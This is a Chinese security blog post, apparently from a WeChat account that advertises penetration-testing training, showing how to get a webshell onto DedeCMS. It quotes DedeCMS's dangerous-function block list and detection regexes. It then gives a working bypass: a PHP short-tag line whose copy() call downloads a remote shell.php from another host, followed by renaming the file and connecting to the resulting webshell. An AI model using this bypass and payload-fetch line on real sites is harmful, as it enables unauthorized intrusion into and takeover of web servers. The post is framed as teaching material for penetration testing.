> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/FRbVHobj6l9m7YjtRReXTg)

免责声明：本公众号所提供的文字和信息仅供学习和研究使用，不得用于任何非法用途。我们强烈谴责任何非法活动，并严格遵守法律法规。读者应该自觉遵守法律法规，不得利用本公众号所提供的信息从事任何违法活动。本公众号不对读者的任何违法行为承担任何责任。

最近暗月弄了数个安全圈交流的群 欢迎前来加入 有需要好友添加微信发送 进群

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACgovOSOSI6zoSagkpt2SdibibuRWoiaiaFYvhmKicmkP6xuBm6FKR5uwLVJhq9QkAPSMCVTvZbFBZjfow/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

需要渗透测试培训联系 扫一扫下面微信  

[【新】暗月渗透测试培训课程](http://mp.weixin.qq.com/s?__biz=MzAwMjc0NTEzMw==&mid=2653587453&idx=1&sn=23ec9ef0c90ba5f499931bdf6effeb40&chksm=811b91bfb66c18a9f042d81d846c947ecc87582cfc1125ccb0456dd1de6b7cc1ad86fd8019b4&scene=21#wechat_redirect)  

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADORJVOFZn6xSXc8aMibrThWpUUObbzecPYXDMs3vqlHCYc87AznAc1hY70aF2q57XWdwwnsNK3EGw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

dedecms 以往很多拿 webshell 的地方都做了限制，导致以往的漏洞点都存在检测，上传 webshell 难度加大。

以下是 dedecms 通用拦截的代码

```
    global $cfg_disable_funs;
    $cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : 'phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace';
    $cfg_disable_funs = $cfg_disable_funs.',[$]GLOBALS,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,require,create_function,array_map,call_user_func,call_user_func_array,array_filert';
    foreach (explode(",", $cfg_disable_funs) as $value) {
        $value = str_replace(" ", "", $value);
        if(!empty($value) && preg_match("#[^a-z]+['\"]*{$value}['\"]*[\s]*[([{']#i", " {$adbody}") == TRUE) {
            $adbody = dede_htmlspecialchars($adbody);
            die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$adbody}</pre>");
        }
        if(!empty($value) && preg_match("#<\?(php|=)#i", " {$adbody}") == TRUE) {
            $adbody = dede_htmlspecialchars($adbody);
            die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$adbody}</pre>");
        }
        if(!empty($value) && preg_match("#(script)[\s]*(language)[\s]*(=)[\s]*\\\\['\"]{1}(php)#i", " {$adbody}") == TRUE) {
            $adbody = dede_htmlspecialchars($adbody);
            die("DedeCMS提示：当前页面中存在恶意代码！<pre>{$adbody}</pre>");
        }

```

可以看到关键词都做了限制。而且还对 <?php 这种标签做了检测。

绕过方法

可以使用 php 另外一种标签 <? ?>

在文件管理里新建一个 txt 然后用 copy 函数 把远程的 webshell 后门 复制到本地

```
<? copy("http://192.168.10.158/shell.php","shell.php");?>

```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADUB7AWFpMsLpcjvSmia0jEZGDLknOaSicBlqkIm4lXrquEQdbrTymZkYicYzE6rtcwN17UVPDqsvKlA/640?wx_fmt=png)

然后将文件重名为 php 文件在访问 在根目录就会生成 webshell

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADUB7AWFpMsLpcjvSmia0jEZpnMpRaD2zXIYqbPN0404GSDjCXl1bCCURxiaiaK76MeCmblXAUvq793w/640?wx_fmt=png)

连接 webshell

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ADUB7AWFpMsLpcjvSmia0jEZxTqAkhhRoW8rHXkl1ZJnw2dN8D8pxh76D6xJF6DnPVicXqFV0lhwfPw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACDiaVR19ykibOZTMnh1EwZAcJicvxAvcCA3Oo1FBFYqlQx50IibLc21ouTlHXTMQb6FyNSfpF0XSZLrA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**关注公众号  
**

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACDiaVR19ykibOZTMnh1EwZAcJicvxAvcCA3Oo1FBFYqlQx50IibLc21ouTlHXTMQb6FyNSfpF0XSZLrA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

公众号长期更新安全类文章，关注公众号，以便下次轻松查阅

觉得文章对你有帮助 请转发 点赞 收藏  

![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ACBFrjV8Xof1hnmwcDpYBFOMSSWLZ73KeiaOGLmNIDmvfhTeSnYkvPt0uQQJ7kcfUNaxbMLtx3wIqg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)